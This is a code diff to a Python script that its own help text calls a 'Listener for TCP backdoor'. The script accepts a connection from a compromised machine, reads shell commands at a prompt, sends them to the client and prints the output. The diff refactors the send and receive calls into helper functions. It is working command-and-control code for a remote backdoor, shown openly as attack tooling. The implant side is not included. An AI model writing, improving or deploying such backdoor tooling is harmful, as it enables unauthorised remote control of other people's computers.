@@ -1,5 +1,6 @@
 import socket
 import utils
+import os
 
 def main():
     args = utils.init_argparse('Listener for TCP backdoor.')
@@ -17,16 +18,16 @@ def main():
         print('[+] Received connection from {ip}.'.format(ip=client_ip))
 
         while True:
-
             cmd = input('$ ')
-            client.sendall(cmd.encode('utf-8'))
-            
-            out = client.recv(1024).decode('utf-8')
+
+            utils.send_data(client, cmd)
+            out = utils.recv_data(client)
             print(out)
 
             if cmd == 'exit':
                 print('[+] Exitting...')
                 break
+
     except KeyboardInterrupt:
         print('\n[+] Exitting...')
 
